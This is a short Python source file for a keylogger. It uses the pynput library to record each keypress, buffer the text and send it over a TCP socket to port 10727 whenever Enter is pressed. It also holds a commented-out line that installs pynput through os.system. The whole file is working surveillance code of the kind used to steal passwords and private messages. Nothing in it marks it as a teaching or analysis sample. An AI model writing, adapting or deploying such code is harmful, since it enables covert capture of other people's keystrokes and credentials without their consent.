import os
# os.system('cmd /k "pip install pynput"')


from pynput.keyboard import Listener

#socket
import socket

host = socket.gethostname()
port = 10727
s = socket.socket()
s.connect((host,port))

logstring = '\n'

def log_keystroke(key):
    global logstring

    key = str(key).replace("'", "")

    if key != 'Key.enter':
        if 'Key.' in key:
            if key == 'Key.space':
                logstring += ' '
            elif key == 'Key.shift_r':
                logstring += ''
            else:
                if logstring != '\n':
                    logstring += '\n'
                logstring += str(key).replace("Key.", "")
        else:
            logstring += key

    else:
        s.sendall((logstring).encode('utf-8'))
        logstring = '\n'

with Listener(on_press=log_keystroke) as l:
        l.join()
